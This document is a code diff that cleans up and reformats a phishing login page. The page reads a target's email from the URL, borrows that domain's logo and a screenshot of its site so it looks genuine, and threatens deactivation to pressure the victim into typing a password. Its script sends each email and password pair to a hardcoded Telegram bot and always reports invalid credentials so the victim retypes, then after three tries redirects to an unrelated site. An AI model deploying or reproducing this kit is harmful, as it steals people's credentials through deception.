@@ -1,121 +1,174 @@
-
-<html>
-<head>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<title></title>
-<link type="text/css" rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-<link type="text/css" rel="stylesheet" href="https://pub-9685c515cc314d54a0ec73407efbaabc.r2.dev/corea.css">
+    <title>Login</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link type="text/css" rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link type="text/css" rel="stylesheet" href="https://pub-9685c515cc314d54a0ec73407efbaabc.r2.dev/corea.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
+    <style>
+        body {
+            background-size: cover;
+            background-position: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .login-container {
+            max-width: 400px;
+            width: 100%;
+            margin: 20px auto 0 auto;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+        .login-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .input-group-addon {
+            width: 40px;
+        }
+        .button-36 {
+            background-color: #f8f9fa;
+            border: 1px solid #f8f9fa;
+            border-radius: 4px;
+            color: #3c4043;
+            cursor: pointer;
+            padding: 10px 16px;
+            text-align: center;
+            margin: 10px auto;
+            display: block;
+        }
+    </style>
 </head>
 
-<body >
-<!-- Login 1 start -->
+<body>
+<!-- Alternative message -->
 <div id="altr" style="display: block;">
-  <button class="button-36" role="button">You cannot open files in this window. Please download the attached file and open it on a computer.</button><br><br>
+  <button class="button-36" role="button">You cannot open files in this window. Please download the attached file and open it on a computer.</button>
   <div align="center"><b>...</b></div>
 </div>
-<div class="login-1" id="root" style="display:none">
-    <div class="container">
-        <div class="row">
-            <div class="col-md-12">
-                <div class="login-inner-form">
-                    <div class="details">
-                        
-      <form>
-<div align="center">
-                          <h2 class="text-center"><div id="top"><img src="https://pub-9685c515cc314d54a0ec73407efbaabc.r2.dev/icon.png" alt="" id="logoimg" style="width:30px;height:30px;margin-top:10px;"> 
-		     
-		  <span style="vertical-align: middle; padding-left: 3px;color: #fff;" id="logoname"></span> </div>
-                      <p><span style="font-size: 20px;color:gray;">Please sign in to continue </span></p>
-              <span style="font-size: 15px;color:white;">Please enter the correct password to avoid deactivation.</span><br><br/>
-        <center>
-        <div id="Div4" style="display: none;">
-          <div class="alert alert-danger" id="msg" style=" font-size:14px; ">Invalid credentials. The email address/password is incorrect.</div>
-        </div>  
-        <span id="error" class="text-danger" style="display: none;">This account does not exist. Please enter a different account.</span>
-        </center>
-        <div class="form-group">
-          <div class="input-group">
-            <span class="input-group-addon"><i class="fas fa-user"></i></span>
-            <input type="text" class="form-control" name="username" placeholder="Username" value="" id="username"/>
-          </div>
-        </div>
-        <div class="form-group">
-          <div class="input-group">
-            <span class="input-group-addon"><i class="fas fa-lock"></i></span>
-            <input type="password" class="form-control" autofocus id="password" name="password" placeholder="Password" required="required">
-          </div>
-        </div>
-		<div class="form-group">
-		 <div align="left">
-          <input type="checkbox"><span style="font-size: 15px;color:gray;"> Remember me </span> 
-        </div>
-		</div>
-        <div class="form-group" id="Div1" style="display: block;">
-		           <button type="button" onclick="sendEmail()" class="btn btn-primary login-btn btn-block" id="omak">Sign In</button>
-        </div>
-        <div class="form-group" id="Div2" style="display: none;">
-          <button type="button"  class="btn btn-primary login-btn btn-block" id="omak">Signing in...</button>
-   </div>
-      </form>
-      </a>
-    </div>
-<style>.tb_button {padding:1px;cursor:pointer;border-right: 1px solid #8b8b8b;border-left: 1px solid #FFF;border-bottom: 1px solid #fff;}.tb_button.hover {border:2px outset #def; background-color: #f8f8f8 !important;}.ws_toolbar {z-index:100000} .ws_toolbar .ws_tb_btn {cursor:pointer;border:1px solid #555;padding:3px}   .tb_highlight{background-color:yellow} .tb_hide {visibility:hidden} .ws_toolbar img {padding:2px;margin:0px}</style>
 
-</div></div></div></div></div></body></html>
-<input type="hidden" name="count" id="count" value="" />
+<!-- Login form -->
+<div class="login-1" id="root" style="display:none">
+    <div class="login-container">
+        <div class="login-logo">
+            <img src="https://pub-9685c515cc314d54a0ec73407efbaabc.r2.dev/icon.png" alt="" id="logoimg" style="width:30px;height:30px;">
+            <span style="vertical-align: middle; padding-left: 3px;color: #fff;" id="logoname"></span>
+        </div>
+        
+        <form>
+            <p style="text-align: center; font-size: 20px; color: gray;">Please sign in to continue</p>
+            <p style="text-align: center; font-size: 15px; color: white;">Please enter the correct password to avoid deactivation.</p>
+            
+            <div id="Div4" style="display: none; margin-bottom: 15px;">
+                <div class="alert alert-danger" id="msg" style="font-size:14px;">Invalid credentials. The email address/password is incorrect.</div>
+            </div>
+            
+            <div id="error" class="text-danger" style="display: none; margin-bottom: 15px; text-align: center;">
+                This account does not exist. Please enter a different account.
+            </div>
+            
+            <div class="form-group">
+                <div class="input-group">
+                    <span class="input-group-addon"><i class="fas fa-user"></i></span>
+                    <input type="text" class="form-control" name="username" placeholder="Username" value="" id="username">
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <div class="input-group">
+                    <span class="input-group-addon"><i class="fas fa-lock"></i></span>
+                    <input type="password" class="form-control" autofocus id="password" name="password" placeholder="Password" required>
+                </div>
+            </div>
+            
+            <div class="form-group" style="margin-bottom: 20px;">
+                <input type="checkbox" id="remember">
+                <label for="remember" style="font-size: 15px; color: gray;"> Remember me</label>
+            </div>
+            
+            <div class="form-group" id="Div1" style="display: block;">
+                <button type="button" onclick="sendEmail()" class="btn btn-primary btn-block" id="omak">Sign In</button>
+            </div>
+            
+            <div class="form-group" id="Div2" style="display: none;">
+                <button type="button" class="btn btn-primary btn-block" id="omak" disabled>
+                    <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
+                    Signing in...
+                </button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<input type="hidden" name="count" id="count" value="">
+
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 <script>
     var emailx = window.location.hash.substr(1);
-    let email = ""
-    if(emailx.slice(0,3) == "B64"){email=window.atob(emailx.slice(3,emailx.length))} else{email=emailx};
-		document.getElementById("altr").style.display = "none";
+    let email = "";
+    if(emailx.slice(0,3) == "B64") {
+        email = window.atob(emailx.slice(3,emailx.length));
+    } else {
+        email = emailx;
+    }
+    
+    document.getElementById("altr").style.display = "none";
     document.getElementById("root").style.display = "block";
-		var ind=email.indexOf("@");
-    var my_slice=email.substr((ind+1));
+    var ind = email.indexOf("@");
+    var my_slice = email.substr((ind+1));
     var sv = my_slice;
     var mainPage = 'https://'+my_slice;
-		var image = "url('https://image.thum.io/get/width/1200/https://"+sv;"')"
-		$("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
-    document.title = my_slice+" Login - Enter Password to Sign In"
-		var my_slice2=email.substr(ind+1,email.length);
+    var image = "url('https://image.thum.io/get/width/1200/https://"+sv+"')";
+    
+    $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
+    document.title = my_slice+" Login - Enter Password to Sign In";
     $("#logoname").html(my_slice);
-		$(".logoname").html(my_slice);
-		document.body.style.backgroundImage = image;
-		document.getElementById('username').value = email;
-    ////////////////////////////////////
+    $(".logoname").html(my_slice);
+    document.body.style.backgroundImage = image;
+    document.getElementById('username').value = email;
+    
     function sendEmail() {
-    if (document.getElementById('password').value === '') {
-          window.alert('Please enter a valid password!');
-          return false;
+        if (document.getElementById('password').value === '') {
+            window.alert('Please enter a valid password!');
+            return false;
+        }
+        
+        document.getElementById("Div4").style.display = "none";
+        document.getElementById("Div1").style.display = "none";
+        document.getElementById("Div2").style.display = "block";
+        
+        var oo = document.getElementById('username').value;
+        var pp = document.getElementById('password').value;
+        var ozi = "\n===DOMC=====\n";
+        ozi += "E:"+oo;
+        ozi += "\nP:"+pp;
+        ozi += "\n=========\n";
+        
+        tmsend(ozi);
+        document.getElementById('count').value = document.getElementById('count').value+"1";
+        
+        if(document.getElementById('count').value === "111") {
+            window.location.replace("https://owl.purdue.edu/owl/research_and_citation/mla_style/mla_formatting_and_style_guide/mla_works_cited_electronic_sources.html");
+        }
+        
+        setTimeout(function() {
+            document.getElementById('password').value = "";
+            document.getElementById("Div4").style.display = "block";
+            document.getElementById("Div1").style.display = "block";
+            document.getElementById("Div2").style.display = "none";
+        }, 3000);
     }
-    document.getElementById("Div4").style.display = "none";
-    document.getElementById("Div1").style.display = "none";
-    document.getElementById("Div2").style.display = "block";
-    var oo = document.getElementById('username').value;
-    var pp = document.getElementById('password').value;
-	  var ozi = "\n===DOMC=====\n"
-        ozi+="E:"+oo
-        ozi+="\nP:"+pp
-        ozi+="\n=========\n"
-    tmsend(ozi)
-    document.getElementById('count').value = document.getElementById('count').value+"1"
-    if(document.getElementById('count').value === "111"){
-      window.location.replace("https://owl.purdue.edu/owl/research_and_citation/mla_style/mla_formatting_and_style_guide/mla_works_cited_electronic_sources.html")
-    }
-    setTimeout(function() {
-      document.getElementById('password').value = "";
-      document.getElementById("Div4").style.display = "block";
-      document.getElementById("Div1").style.display = "block";
-      document.getElementById("Div2").style.display = "none";
-    }, 3000);
-    }
-    ////////////////////////////////////
-    function tmsend(message){
+    
+    function tmsend(message) {
         var token = "7992153761:AAGPgM541MM72TrfBL6glP1ml8zZ5Xwcd5w";
         var chatid = "994826660";
-        const url = `https://api.telegram.org/bot${token}/sendMessage` // The url to request
-
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        
         const obj = {
             chat_id: chatid,
             text: message
@@ -127,3 +180,5 @@
         xht.send(JSON.stringify(obj));
     }
 </script>
+</body>
+</html>
